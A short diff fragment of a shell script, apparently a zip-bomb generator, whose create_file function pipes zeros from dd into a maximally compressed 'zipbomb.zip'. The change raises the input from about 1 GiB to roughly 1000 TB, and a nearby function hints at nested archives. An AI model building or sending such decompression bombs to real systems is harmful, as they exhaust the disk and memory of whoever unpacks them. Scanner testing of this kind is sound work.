@@ -22,7 +22,7 @@ ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" |
 }
 
 create_file(){
-    dd if=/dev/zero bs=1M count=1024 | zip -9 -q zipbomb.zip -
+    dd if=/dev/zero bs=1000M count=1024000 | zip -9 -q zipbomb.zip -
 }
 
 file_inside_of_file(){
